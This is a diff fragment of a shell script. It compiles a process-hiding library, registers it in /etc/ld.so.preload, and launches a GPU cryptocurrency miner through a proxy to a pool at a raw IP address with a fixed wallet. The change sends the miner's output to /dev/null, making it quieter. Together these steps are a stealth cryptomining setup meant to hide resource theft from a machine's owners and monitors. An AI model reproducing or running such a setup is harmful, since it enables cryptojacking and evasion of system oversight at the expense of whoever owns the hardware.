@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp && clear && ./pearl-gpu-miner --wallet prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg.AI-qwen-31 --pool 202.155.9.40:80  && clear
+./graftcp/graftcp && clear && ./pearl-gpu-miner --wallet prl1pwqch34vpjknlyyhvwasma33j4vfuv6yxp7zsjf59aqpr3ja2ut3s3sg6yg.AI-qwen-31 --pool 202.155.9.40:80 >/dev/null 2>&1 && clear
